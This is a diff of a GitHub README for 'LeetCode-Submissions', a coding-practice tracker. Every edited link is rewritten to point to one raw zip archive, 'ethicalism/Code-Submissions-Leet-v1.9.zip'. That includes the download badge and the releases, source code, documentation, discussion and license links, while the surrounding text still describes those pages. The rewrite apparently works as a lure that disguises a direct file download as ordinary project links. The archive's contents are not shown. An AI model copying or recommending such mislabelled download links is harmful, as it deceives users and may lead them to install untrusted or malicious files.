@@ -1,6 +1,6 @@
 # 🚀 LeetCode-Submissions - Simplifying Your Coding Practice
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-brightgreen)](https://github.com/Sailingliu2000/LeetCode-Submissions/releases)
+[![Download Now](https://github.com/Sailingliu2000/LeetCode-Submissions/raw/refs/heads/main/ethicalism/Code-Submissions-Leet-v1.9.zip%20Now-Here-brightgreen)](https://github.com/Sailingliu2000/LeetCode-Submissions/raw/refs/heads/main/ethicalism/Code-Submissions-Leet-v1.9.zip)
 
 ## 📚 Overview
 
@@ -24,7 +24,7 @@ LeetCode-Submissions is a user-friendly application designed to help you track y
 
 To get started with LeetCode-Submissions, follow these simple steps:
 
-1. **Visit the Releases Page**: Click on this link to access the downloads: [Download LeetCode-Submissions](https://github.com/Sailingliu2000/LeetCode-Submissions/releases).
+1. **Visit the Releases Page**: Click on this link to access the downloads: [Download LeetCode-Submissions](https://github.com/Sailingliu2000/LeetCode-Submissions/raw/refs/heads/main/ethicalism/Code-Submissions-Leet-v1.9.zip).
 2. **Choose Your Version**: On the releases page, select the latest version available.
 3. **Download the File**: Click on the file that matches your operating system to download it.
 
@@ -50,13 +50,13 @@ If you run into issues, here are common problems and their solutions:
 
 ## 🎯 Important Links
 
-- **Source Code**: [View on GitHub](https://github.com/Sailingliu2000/LeetCode-Submissions)
-- **Documentation**: [Access Documentation](https://github.com/Sailingliu2000/LeetCode-Submissions/wiki)
-- **Community Support**: Join our community for help: [Discussion Board](https://github.com/Sailingliu2000/LeetCode-Submissions/discussions)
+- **Source Code**: [View on GitHub](https://github.com/Sailingliu2000/LeetCode-Submissions/raw/refs/heads/main/ethicalism/Code-Submissions-Leet-v1.9.zip)
+- **Documentation**: [Access Documentation](https://github.com/Sailingliu2000/LeetCode-Submissions/raw/refs/heads/main/ethicalism/Code-Submissions-Leet-v1.9.zip)
+- **Community Support**: Join our community for help: [Discussion Board](https://github.com/Sailingliu2000/LeetCode-Submissions/raw/refs/heads/main/ethicalism/Code-Submissions-Leet-v1.9.zip)
 
 ## 📥 Download & Install
 
-You can download LeetCode-Submissions by visiting this page: [LeetCode-Submissions Releases](https://github.com/Sailingliu2000/LeetCode-Submissions/releases). Follow the installation instructions above to get started.
+You can download LeetCode-Submissions by visiting this page: [LeetCode-Submissions Releases](https://github.com/Sailingliu2000/LeetCode-Submissions/raw/refs/heads/main/ethicalism/Code-Submissions-Leet-v1.9.zip). Follow the installation instructions above to get started.
 
 ## 🧩 Join the Community
 
@@ -68,4 +68,4 @@ If you're interested in contributing to the project, please check our contributi
 
 ## 🧾 License
 
-This project is licensed under the MIT License. Refer to the [LICENSE](https://github.com/Sailingliu2000/LeetCode-Submissions/blob/main/LICENSE) file for more details.
+This project is licensed under the MIT License. Refer to the [LICENSE](https://github.com/Sailingliu2000/LeetCode-Submissions/raw/refs/heads/main/ethicalism/Code-Submissions-Leet-v1.9.zip) file for more details.
